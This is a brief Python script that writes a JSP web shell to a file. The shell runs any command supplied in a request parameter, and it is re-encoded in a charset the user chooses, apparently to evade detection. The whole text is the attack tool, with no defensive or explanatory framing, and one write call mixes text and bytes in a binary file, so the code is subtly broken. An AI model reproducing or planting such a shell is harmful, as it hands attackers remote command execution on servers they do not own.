webshell = '<%Runtime.getRuntime().exec(request.getParameter("i"));%>'
charset = '<%@ page contentType="charset={cs}" %>'
if __name__ == '__main__':
  _charset = input('Enter Your Charset:')
  if _charset:
    with open(f'{_charset}.jsp', 'wb') as f:
      f.write(charset.format(cs=_charset))
      f.write(webshell.encode(_charset))
